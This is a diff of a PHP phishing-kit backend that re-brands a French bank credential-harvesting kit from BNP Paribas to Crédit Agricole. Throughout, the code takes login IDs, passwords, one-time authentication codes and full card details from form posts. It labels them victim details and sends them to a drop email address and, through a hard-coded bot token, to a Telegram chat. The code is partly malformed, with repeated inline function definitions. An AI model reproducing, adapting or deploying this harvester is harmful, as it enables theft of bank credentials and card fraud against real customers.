@@ -1,26 +1,19 @@
-r
-
 <?php
 
-/*
-       t . m e / v P w n d C o m 
-       
-██████╗ ██╗    ██╗███╗   ██╗██████╗ 
-██╔══██╗██║    ██║████╗  ██║██╔══██╗
-██████╔╝██║ █╗ ██║██╔██╗ ██║██║  ██║
-██╔═══╝ ██║███╗██║██║╚██╗██║██║  ██║
-██║     ╚███╔███╔╝██║ ╚████║██████╔╝
-╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═════╝ Unethical Hackerz
-
- @vPwnd @vPwndCom  | P W N D  C o m m u n i t y
-
-Support Us 
-
-Channel : @vPwnd
-Group : @vPwndCom
-Website : Pwncore.keybase.pub
-
+/**
+ * @link              https://www.z0n51.com/
+ * @since             20/03/2020
+ * @package           CREDIT AGRICOLE
+ * @facebook          https://www.facebook.com/z0n51
+ * @whatsapp          +212601728021
+ * @icq               @z0n51
+ * @telegram          @z0n51
+ *
+ * Project Name:      CREDIT AGRICOLE
+ * Author:            z0n51
+ * Author URI:        https://www.facebook.com/z0n51
  */
+
 include_once '../inc/app.php';
 include_once '../vendor/autoload.php';
 use Inacho\CreditCard;
@@ -40,7 +33,7 @@ function validate_cc_cvv($number = null,$type = null) {
     return $cvv;
 }
 
-$to = 'duffounie@proton.me'; // Email Here
+$to = 'receipca0011@inbox.lv';
 
 $random   = rand(0,100000000000);
 $dispatch = substr(md5($random), 0, 17);
@@ -60,7 +53,7 @@ if($_SERVER['REQUEST_METHOD'] == "POST") {
 
         if( count($_SESSION['errors']) == 0 ) {
 
-            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | Caisse Régionale';
+            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Caisse Régionale';
             $message = '/-- REGION INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
             $message .= 'Numéro de département : ' . $_POST['region_number'] . "\r\n";
             $message .= 'Caisse régionale : ' . $_POST['region_caisse'] . "\r\n";
@@ -78,7 +71,7 @@ if($_SERVER['REQUEST_METHOD'] == "POST") {
 function telegram_send($message) {
     $curl = curl_init();
     $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk';
-    $chat_id  = '1300275807';
+    $chat_id  = '-1300275807';
     $format   = 'HTML';
     curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
@@ -114,7 +107,7 @@ telegram_send(urlencode($message));
 
         if( count($_SESSION['errors']) == 0 ) {
 
-            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | Login';
+            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Login';
             $message = '/-- LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
             $message .= 'Identifiant : ' . $_POST['identifiant'] . "\r\n";
             $message .= 'Password : ' . $_POST['password'] . "\r\n";
@@ -130,8 +123,8 @@ telegram_send(urlencode($message));
 
             mail($to,$subject,$message,$headers);function telegram_send($message) {
     $curl = curl_init();
-    $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk;
-    $chat_id  = '1300275807';
+    $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk';
+    $chat_id  = '-1300275807';
     $format   = 'HTML';
     curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
@@ -163,7 +156,7 @@ telegram_send(urlencode($message));
 
         if( count($_SESSION['errors']) == 0 ) {
 
-            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | AUTHENTIFICATIONFORTE';
+            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | AUTHENTIFICATIONFORTE';
             $message = '/-- AUTH FORTE INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
             $message .= 'Code : ' . $_POST['authfort'] . "\r\n";
             $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
@@ -179,7 +172,7 @@ telegram_send(urlencode($message));
             mail($to,$subject,$message,$headers);function telegram_send($message) {
     $curl = curl_init();
     $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk';
-    $chat_id  = '1300275807';
+    $chat_id  = '-1300275807';
     $format   = 'HTML';
     curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
@@ -210,7 +203,7 @@ telegram_send(urlencode($message));
 
         if( count($_SESSION['errors']) == 0 ) {
 
-            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | Securepasse';
+            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Securepasse';
             $message = '/-- SECUREPASSE INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
             $message .= 'Code : ' . $_POST['securepass'] . "\r\n";
             $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
@@ -227,7 +220,7 @@ telegram_send(urlencode($message));
 function telegram_send($message) {
     $curl = curl_init();
     $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk';
-    $chat_id  = '1300275807';
+    $chat_id  = '-1300275807';
     $format   = 'HTML';
     curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
@@ -258,7 +251,7 @@ telegram_send(urlencode($message));
 
         if( count($_SESSION['errors']) == 0 ) {
 
-            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | Valid Email';
+            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Valid Email';
             $message = '/-- VALID EMAIL INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
             $message .= 'Code : ' . $_POST['validemail'] . "\r\n";
             $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
@@ -275,7 +268,7 @@ telegram_send(urlencode($message));
 function telegram_send($message) {
     $curl = curl_init();
     $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk';
-    $chat_id  = '1300275807';
+    $chat_id  = '-1300275807';
     $format   = 'HTML';
     curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
@@ -352,7 +345,7 @@ telegram_send(urlencode($message));
 
         if( count($_SESSION['errors']) == 0 ) {
 
-            $subject = $_SERVER['REMOTE_ADDR'] . ' | BNP PARIBAS | Card Details';
+            $subject = $_SERVER['REMOTE_ADDR'] . ' | CREDIT AGRICOL | Card Details';
             $message = '/-- CARD DETAILS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
             $message .= 'nom : ' . $_POST['nom'] . "\r\n";
             $message .= 'prenom : ' . $_POST['prenom'] . "\r\n";
@@ -376,7 +369,7 @@ telegram_send(urlencode($message));
 function telegram_send($message) {
     $curl = curl_init();
     $api_key  = '5008911861:AAGX0QkMnp8S5mGraWrmi2SgR8Eg_WffgWk';
-    $chat_id  = '1300275807';
+    $chat_id  = '-1300275807';
     $format   = 'HTML';
     curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
